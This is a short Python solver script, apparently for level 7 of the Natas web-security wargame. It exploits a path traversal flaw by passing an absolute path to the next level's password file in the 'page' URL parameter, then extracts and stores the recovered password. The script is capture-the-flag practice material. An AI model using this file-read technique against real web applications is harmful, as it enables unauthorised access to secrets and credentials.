"""
natas7: URL parameters, path traversal
"""

import requests
from typing import Optional

from natas_utils import *

LEVEL = 7

def solve(url: str, login: LevelLogin) -> Optional[str]:
    # links on the page use URL parameters to specify pages
    # solve by passing an absolute path to password file
    response = requests.get(url, auth=login, params={"page": flag_file_abspath(LEVEL + 1)})

    natas8_password = try_level_login(LEVEL + 1, extract_candidate_passwords(response.text))

    return natas8_password

if __name__ == "__main__":
    url, login = load_level(LEVEL)
    natas8_password = solve(url, login)

    if natas8_password:
        print("natas8:", natas8_password)
        store_level_password(LEVEL + 1, natas8_password)
    else:
        exit("Failed to get password for the next level.")